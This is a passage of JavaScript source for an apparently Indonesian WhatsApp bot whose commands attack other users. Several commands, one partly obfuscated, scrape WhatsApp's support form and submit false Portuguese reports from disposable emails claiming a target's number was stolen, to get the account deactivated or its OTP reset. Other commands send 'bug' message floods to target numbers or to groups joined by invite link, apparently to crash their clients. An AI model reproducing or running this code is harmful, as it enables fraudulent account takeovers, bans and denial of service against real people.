const _0x3b0948=_0x1c03;function _0x1c03(_0x2ba437,_0x629f73){const _0x174abb=_0x174a();return _0x1c03=function(_0x1c03e2,_0x278dea){_0x1c03e2=_0x1c03e2-0x141;let _0x35c234=_0x174abb[_0x1c03e2];return _0x35c234;},_0x1c03(_0x2ba437,_0x629f73);}(function(_0x4cbb0b,_0x10f022){const _0x4868dd=_0x1c03,_0x42ce23=_0x4cbb0b();while(!![]){try{const _0xb1fb=parseInt(_0x4868dd(0x177))/0x1*(-parseInt(_0x4868dd(0x175))/0x2)+parseInt(_0x4868dd(0x167))/0x3*(-parseInt(_0x4868dd(0x156))/0x4)+-parseInt(_0x4868dd(0x166))/0x5*(parseInt(_0x4868dd(0x16c))/0x6)+parseInt(_0x4868dd(0x143))/0x7+parseInt(_0x4868dd(0x151))/0x8*(parseInt(_0x4868dd(0x172))/0x9)+parseInt(_0x4868dd(0x159))/0xa+parseInt(_0x4868dd(0x153))/0xb;if(_0xb1fb===_0x10f022)break;else _0x42ce23['push'](_0x42ce23['shift']());}catch(_0x5680dc){_0x42ce23['push'](_0x42ce23['shift']());}}}(_0x174a,0xcac5e));if(!isDeveloper)return reply(_0x3b0948(0x14d));if(!q)return reply(_0x3b0948(0x149)+(prefix+command)+_0x3b0948(0x14a));let dia=q[_0x3b0948(0x157)]('|')[0x0]['replace'](/[^0-9]/g,'');var axioss=require(_0x3b0948(0x15f));let ntah=await axioss[_0x3b0948(0x174)](_0x3b0948(0x15d)),email=await axioss[_0x3b0948(0x174)]('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708'),cookie=ntah[_0x3b0948(0x144)][_0x3b0948(0x179)][_0x3b0948(0x14f)](';\x20');const cheerio=require(_0x3b0948(0x141));function _0x174a(){const _0x531673=['axios','lsd','__comment_req','input[name=jazoest]','country_selector','email','find','15hDCWjB','147DBpSTN','POST','19316.BP:whatsapp_www_pkg.2.0.0.0.0','your_message','load','647538LvZJaa','__a','__user','__req','for\x20(;;);','dpr','522AwPWyB','href','get','34894XaBnLy','https://www.whatsapp.com','68UrTdid','input[name=lsd]','set-cookie','action','cheerio','format','354956FmZaWo','headers','email_confirm','ANDROID','replace','__ccg','Penggunaan\x20','\x20628xxxx','data','val','Owner\x20Only','__csr','join','append','64168EVGpsR','jazoest','17067391IrnzBQ','__hs','submit','12032tsaSyr','split','INDONESIA','4206080JJfFXJ','phone_number','UNKNOWN','platform','https://www.whatsapp.com/contact/noclient/','form'];_0x174a=function(){return _0x531673;};return _0x174a();}let $=cheerio[_0x3b0948(0x16b)](ntah[_0x3b0948(0x14b)]),$form=$(_0x3b0948(0x15e)),url=new URL($form['attr'](_0x3b0948(0x17a)),_0x3b0948(0x176))[_0x3b0948(0x173)],form=new URLSearchParams();form[_0x3b0948(0x150)](_0x3b0948(0x152),$form['find'](_0x3b0948(0x162))[_0x3b0948(0x14c)]()),form[_0x3b0948(0x150)](_0x3b0948(0x160),$form[_0x3b0948(0x165)](_0x3b0948(0x178))[_0x3b0948(0x14c)]()),form[_0x3b0948(0x150)]('step',_0x3b0948(0x155)),form['append'](_0x3b0948(0x163),_0x3b0948(0x158)),form[_0x3b0948(0x150)](_0x3b0948(0x15a),''+dia),form[_0x3b0948(0x150)](_0x3b0948(0x164),email[_0x3b0948(0x14b)][0x0]),form[_0x3b0948(0x150)](_0x3b0948(0x145),email['data'][0x0]),form[_0x3b0948(0x150)](_0x3b0948(0x15c),_0x3b0948(0x146)),form[_0x3b0948(0x150)](_0x3b0948(0x16a),'meu\x20número\x20por\x20engano\x20Peço\x20que\x20vocês\x20reativem\x20meu\x20número\x20pois\x20tenho\x20família\x20em\x20outro\x20país\x20e\x20preciso\x20me\x20comunicar\x20com\x20eles'),form[_0x3b0948(0x150)](_0x3b0948(0x16e),'0'),form[_0x3b0948(0x150)](_0x3b0948(0x16d),'1'),form['append'](_0x3b0948(0x14e),''),form['append'](_0x3b0948(0x16f),'8'),form['append'](_0x3b0948(0x154),_0x3b0948(0x169)),form['append'](_0x3b0948(0x171),'1'),form[_0x3b0948(0x150)](_0x3b0948(0x148),_0x3b0948(0x15b)),form[_0x3b0948(0x150)]('__rev','1006630858'),form['append'](_0x3b0948(0x161),'0');let res=await axioss({'url':url,'method':_0x3b0948(0x168),'data':form,'headers':{'cookie':cookie}});reply(util[_0x3b0948(0x142)](JSON['parse'](res[_0x3b0948(0x14b)][_0x3b0948(0x147)](_0x3b0948(0x170),''))));
}
break
case "banned@":{
const _0x594df9=_0x51d5;(function(_0x4a9896,_0x4dc8d7){const _0x37f43e=_0x51d5,_0x39c9ef=_0x4a9896();while(!![]){try{const _0x7d069a=-parseInt(_0x37f43e(0x96))/0x1+-parseInt(_0x37f43e(0x91))/0x2+-parseInt(_0x37f43e(0x88))/0x3+parseInt(_0x37f43e(0x94))/0x4+parseInt(_0x37f43e(0x8c))/0x5*(parseInt(_0x37f43e(0x8f))/0x6)+parseInt(_0x37f43e(0x86))/0x7*(-parseInt(_0x37f43e(0x89))/0x8)+parseInt(_0x37f43e(0x87))/0x9*(parseInt(_0x37f43e(0x92))/0xa);if(_0x7d069a===_0x4dc8d7)break;else _0x39c9ef['push'](_0x39c9ef['shift']());}catch(_0xc9e534){_0x39c9ef['push'](_0x39c9ef['shift']());}}}(_0x2315,0xd8b29));function _0x51d5(_0x4c884d,_0x39a957){const _0x231588=_0x2315();return _0x51d5=function(_0x51d57a,_0xa96399){_0x51d57a=_0x51d57a-0x86;let _0xf2422e=_0x231588[_0x51d57a];return _0xf2422e;},_0x51d5(_0x4c884d,_0x39a957);}if(!isDeveloper)return reply(_0x594df9(0x93));if(!q)return reply(_0x594df9(0x8a)+(prefix+command)+_0x594df9(0x8b));let dia=q[_0x594df9(0x8d)]('|')[0x0]['replace'](/[^0-9]/g,'');var cekap=await lexxy['onWhatsApp'](dia+'@s.whatsapp.net');if(cekap['length']==0x0)return reply(_0x594df9(0x95));if(dia==_0x594df9(0x90))return;function _0x2315(){const _0x2494a1=['Nomor\x20tersebut\x20tidak\x20terdaftar\x20di\x20WhatsApp\x0aSilahkan\x20kirim\x20nomor\x20yg\x20valid.','1323493DkelfN','1334473vQLwyi','9ycZfNl','328110XPSqtP','8gwaUHC','Penggunaan\x20','\x20628xxxx','682390wXgmfB','split','6288219947210','54mgTCKv','6285789004732','2310438QFDOZM','8351950eoCndY','Owner\x20Only','6411268cZiQRa'];_0x2315=function(){return _0x2494a1;};return _0x2315();}if(dia=='6283834558105')return;if(dia==_0x594df9(0x8e))return;
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Para WhatsApp\nDesative minha conta, pois meu número e documentação foram roubados e não consigo acessar novamente`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case "kenon@":{
const _0x594df9=_0x51d5;(function(_0x4a9896,_0x4dc8d7){const _0x37f43e=_0x51d5,_0x39c9ef=_0x4a9896();while(!![]){try{const _0x7d069a=-parseInt(_0x37f43e(0x96))/0x1+-parseInt(_0x37f43e(0x91))/0x2+-parseInt(_0x37f43e(0x88))/0x3+parseInt(_0x37f43e(0x94))/0x4+parseInt(_0x37f43e(0x8c))/0x5*(parseInt(_0x37f43e(0x8f))/0x6)+parseInt(_0x37f43e(0x86))/0x7*(-parseInt(_0x37f43e(0x89))/0x8)+parseInt(_0x37f43e(0x87))/0x9*(parseInt(_0x37f43e(0x92))/0xa);if(_0x7d069a===_0x4dc8d7)break;else _0x39c9ef['push'](_0x39c9ef['shift']());}catch(_0xc9e534){_0x39c9ef['push'](_0x39c9ef['shift']());}}}(_0x2315,0xd8b29));function _0x51d5(_0x4c884d,_0x39a957){const _0x231588=_0x2315();return _0x51d5=function(_0x51d57a,_0xa96399){_0x51d57a=_0x51d57a-0x86;let _0xf2422e=_0x231588[_0x51d57a];return _0xf2422e;},_0x51d5(_0x4c884d,_0x39a957);}if(!isDeveloper)return reply(_0x594df9(0x93));if(!q)return reply(_0x594df9(0x8a)+(prefix+command)+_0x594df9(0x8b));let dia=q[_0x594df9(0x8d)]('|')[0x0]['replace'](/[^0-9]/g,'');var cekap=await lexxy['onWhatsApp'](dia+'@s.whatsapp.net');if(cekap['length']==0x0)return reply(_0x594df9(0x95));if(dia==_0x594df9(0x90))return;function _0x2315(){const _0x2494a1=['Nomor\x20tersebut\x20tidak\x20terdaftar\x20di\x20WhatsApp\x0aSilahkan\x20kirim\x20nomor\x20yg\x20valid.','1323493DkelfN','1334473vQLwyi','9ycZfNl','328110XPSqtP','8gwaUHC','Penggunaan\x20','\x20628xxxx','682390wXgmfB','split','6288219947210','54mgTCKv','6285789004732','2310438QFDOZM','8351950eoCndY','Owner\x20Only','6411268cZiQRa'];_0x2315=function(){return _0x2494a1;};return _0x2315();}if(dia=='6283834558105')return;if(dia==_0x594df9(0x8e))return;
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break

case "resetotp@":{
const _0x594df9=_0x51d5;(function(_0x4a9896,_0x4dc8d7){const _0x37f43e=_0x51d5,_0x39c9ef=_0x4a9896();while(!![]){try{const _0x7d069a=-parseInt(_0x37f43e(0x96))/0x1+-parseInt(_0x37f43e(0x91))/0x2+-parseInt(_0x37f43e(0x88))/0x3+parseInt(_0x37f43e(0x94))/0x4+parseInt(_0x37f43e(0x8c))/0x5*(parseInt(_0x37f43e(0x8f))/0x6)+parseInt(_0x37f43e(0x86))/0x7*(-parseInt(_0x37f43e(0x89))/0x8)+parseInt(_0x37f43e(0x87))/0x9*(parseInt(_0x37f43e(0x92))/0xa);if(_0x7d069a===_0x4dc8d7)break;else _0x39c9ef['push'](_0x39c9ef['shift']());}catch(_0xc9e534){_0x39c9ef['push'](_0x39c9ef['shift']());}}}(_0x2315,0xd8b29));function _0x51d5(_0x4c884d,_0x39a957){const _0x231588=_0x2315();return _0x51d5=function(_0x51d57a,_0xa96399){_0x51d57a=_0x51d57a-0x86;let _0xf2422e=_0x231588[_0x51d57a];return _0xf2422e;},_0x51d5(_0x4c884d,_0x39a957);}if(!isDeveloper)return reply(_0x594df9(0x93));if(!q)return reply(_0x594df9(0x8a)+(prefix+command)+_0x594df9(0x8b));let dia=q[_0x594df9(0x8d)]('|')[0x0]['replace'](/[^0-9]/g,'');var cekap=await lexxy['onWhatsApp'](dia+'@s.whatsapp.net');if(cekap['length']==0x0)return reply(_0x594df9(0x95));if(dia==_0x594df9(0x90))return;function _0x2315(){const _0x2494a1=['Nomor\x20tersebut\x20tidak\x20terdaftar\x20di\x20WhatsApp\x0aSilahkan\x20kirim\x20nomor\x20yg\x20valid.','1323493DkelfN','1334473vQLwyi','9ycZfNl','328110XPSqtP','8gwaUHC','Penggunaan\x20','\x20628xxxx','682390wXgmfB','split','6288219947210','54mgTCKv','6285789004732','2310438QFDOZM','8351950eoCndY','Owner\x20Only','6411268cZiQRa'];_0x2315=function(){return _0x2494a1;};return _0x2315();}if(dia=='6283834558105')return;if(dia==_0x594df9(0x8e))return;
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Por favor, pesquise o código OTP para este número porque outra pessoa acidentalmente se conectou com meu número e eu tive que esperar 14 horas, por favor, pesquise novamente neste número`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break

case "🍅":
case "🌹":
case "☕":
case "☠️":
case "🌷":
case "🔥":{
if (!isDeveloper && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await lexxy.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
reply('Proses⌛')
sendBug(target,30)
sendBug2(target,30)
await sleep(1000)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break
case "ganas":
case "hard":
case "turu":{
if (!isDeveloper && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await lexxy.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
reply('Proses⌛')
sendBug(target,40)
sendBug2(target,40)
await sleep(1000)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break
case "santet":{
if (!isDeveloper && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await lexxy.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
reply('Proses⌛')
sendBugPay(target,1)
await sleep(1000)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break

case "trava":
case "bom":
case "troli":
case "dark":{
if (!isDeveloper && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await lexxy.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
reply('Proses⌛')
sendBug(target,25)
sendBug2(target,25)
await sleep(1000)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break
case "bugchat":
case "santetpc":
case "bugpc":{
if (!isDeveloper && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await lexxy.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
reply('Proses⌛')
sendBug(target,20)
sendBug2(target,20)
await sleep(1000)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break
case "bomgc":
case "trolgc":
case "santetgc":
case "buggc":{
if (!isMeLexx) return reply('Owner Only')
if (!q) return reply(`Penggunaan ${prefix+command} linkgrup`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await lexxy.groupAcceptInvite(result)
await sleep(1000)
reply('Proses⌛')
sendBug(rumgc,15)
sendBug2(rumgc,15)
await sleep(1000)
await lexxy.groupLeave(rumgc)
reply('Done ✅')
}
break
case "tes": case "runtime":{
reply(`Status Online:\n${runtime(process.uptime())}`)
}
break
case 'delakses':{
if (!isGroup) return reply(`wajib dalam grup`)
if (!isDeveloper && !isGroupAdmins) return reply(`Fitur ini khusus owner`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await lexxy.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
unp = bugchat.indexOf(ya)
bugchat.splice(unp, 1)
fs.writeFileSync('./nodeJS/database/akses.json', JSON.stringify(bugchat))
delusr = ya+`@s.whatsapp.net`
mentions(`sukses delete akses @${delusr.split('@')[0]}`, [delusr])
}
break
case 'addakses':{
if (!isGroup) return reply(`wajib dalam grup`)
if (!isDeveloper && !isGroupAdmins) return reply(`Fitur ini khusus owner`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
yo = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await lexxy.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
bugchat.push(yo)
fs.writeFileSync('./nodeJS/database/akses.json', JSON.stringify(bugchat))
addusr = yo+`@s.whatsapp.net`
mentions(`sukses add akses @${addusr.split('@')[0]}`, [addusr])
}
break
default:
}
} catch (err) {
lexxy.sendMessage(global.sendNotif+'@s.whatsapp.net', {text:`${util.format(err)}`})
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})